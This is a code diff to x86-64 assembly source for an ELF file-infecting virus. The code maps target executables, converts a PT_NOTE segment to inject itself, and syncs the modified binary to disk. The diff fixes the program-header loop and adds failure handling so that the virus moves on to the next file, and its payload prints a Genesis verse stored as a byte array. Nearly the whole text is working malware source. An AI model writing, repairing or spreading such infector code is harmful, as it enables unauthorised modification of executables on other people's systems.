@@ -74,25 +74,27 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
     
       ;; INFECT FILE >------------------------------------------------------<
 
-      push  rbx
-      call  Infect
-      pop   rbx
+      push  rbx                                       ; Save FD
+      call  Infect                                    ; Try to infect file
+      cmp   rax,  0x00                                ; if no success --.
+      pop   rbx                                       ; Get FD back     |
+      jne   .NextFile                                 ; <---Next-File---'
 
       ;; EXEC PAYLOAD (PRINT STDOUT) >--------------------------------------<
 
       call .Payload
     
       .msg:    ; idk why I made it a byte array...
-    	  db	0x47, 0x65, 0x6e, 0x65, 0x73, 0x69, 0x73, 0x20, 0x31, 0x3a, 
-	      db	0x32, 0x32, 0x20, 0x7e, 0x20, 0x47, 0x6f, 0x64, 0x20, 0x62, 
-	      db	0x6c, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x74, 0x68, 0x65, 
-	      db	0x6d, 0x2c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x61, 0x69, 
-	      db	0x64, 0x20, 0x27, 0x42, 0x65, 0x20, 0x66, 0x72, 0x75, 0x69, 
-	      db	0x74, 0x66, 0x69, 0x6c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x6d, 
-	      db	0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x79, 0x2c, 0x20, 0x66, 
-	      db	0x69, 0x6c, 0x6c, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x61, 
-	      db	0x72, 0x74, 0x68, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x75, 
-	      db	0x62, 0x64, 0x75, 0x65, 0x20, 0x69, 0x74, 0x27, 0x2e, 0x0a, 
+        db	0x47, 0x65, 0x6e, 0x65, 0x73, 0x69, 0x73, 0x20, 0x31, 0x3a, 
+        db	0x32, 0x32, 0x20, 0x7e, 0x20, 0x47, 0x6f, 0x64, 0x20, 0x62, 
+        db	0x6c, 0x65, 0x73, 0x73, 0x65, 0x64, 0x20, 0x74, 0x68, 0x65, 
+        db	0x6d, 0x2c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x61, 0x69, 
+        db	0x64, 0x20, 0x27, 0x42, 0x65, 0x20, 0x66, 0x72, 0x75, 0x69, 
+        db	0x74, 0x66, 0x69, 0x6c, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x6d, 
+        db	0x75, 0x6c, 0x74, 0x69, 0x70, 0x6c, 0x79, 0x2c, 0x20, 0x66, 
+        db	0x69, 0x6c, 0x6c, 0x20, 0x74, 0x68, 0x65, 0x20, 0x65, 0x61, 
+        db	0x72, 0x74, 0x68, 0x20, 0x61, 0x6e, 0x64, 0x20, 0x73, 0x75, 
+        db	0x62, 0x64, 0x75, 0x65, 0x20, 0x69, 0x74, 0x27, 0x2e, 0x0a, 
         db  0x00
         msglen equ $-.msg
 
@@ -130,7 +132,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   
   FStat   rdi,  rsp
   test    rax,  rax
-  jne     .InfectExit
+  jne     .InfectFailureExit
   
   ; extend filesize (ftruncate)
   xor     rbx,  rbx
@@ -150,7 +152,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   xor     rsi,  rsi
   FTruncate     rdi,  rbx
   test    rax,  rax
-  jne     .InfectExit
+  jne     .InfectFailureExit
 
   sub     rsp,  0x28
   push    rbx
@@ -166,7 +168,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   pop     r10
 
   test    rax,  rax                                 ; check if mmap(...) failed
-  js      .InfectExit
+  js      .InfectFailureExit
 
   push    rax                                       ; rsp         -> FileMap (ELF-HDR)
                                                     ; rsp + 0x8   -> FileSz
@@ -211,12 +213,12 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
 
     movzx   rbx,  word [rax + rbx]                    ; rbx = *(phoff + (phentsize * i))
     
-    cmp     rbx, PT_NOTE
+    cmp     rbx,  PT_NOTE
     je      .ConvertPtNote
     
-    cmp     rcx,  [rax + elf64_hdr.e_phnum]
-    inc     rcx,  
-    jnz     .ProgramHdrLoop
+    inc     rcx
+    cmp     cx,   word [rdx + elf64_hdr.e_phnum]
+    jl      .ProgramHdrLoop
 
   jmp .InfectCleanUp
 
@@ -288,8 +290,7 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   sub   rsp,  0x8
   push  rdi
 
-  ; msync(addr, len, MS_SYNC) 
-  MSync rdx, [rsp + 0x18], MS_SYNC
+  MSync rdx, [rsp + 0x18], MS_SYNC                        ; msync(addr, len, MS_SYNC)
 
   pop   rdi
   add   rsp,  0x8
@@ -298,13 +299,21 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   js    .InfectCleanUp
 
   ; fsync(fd) - just to make sure
-  FSync rdi
+  FSync rdi                                               ; fsync(fd)
+
+  MUnMap  [rsp], [rsp + 0x8]                              ; free mapped file
+
+  xor     rax,  rax                                       ; return 0
+  mov     rsp,  rbp
+  pop     rbp
+  ret
 
   .InfectCleanUp:
-  MUnMap  [rsp], [rsp + 0x8]
+  MUnMap  [rsp], [rsp + 0x8]                              ; free mapped file
 
-  .InfectExit:
-  xor     rax,  rax
+  .InfectFailureExit:
+  xor     rax,  rax                                       ; return 1
+  inc     rax
   mov     rsp,  rbp
   pop     rbp
   ret
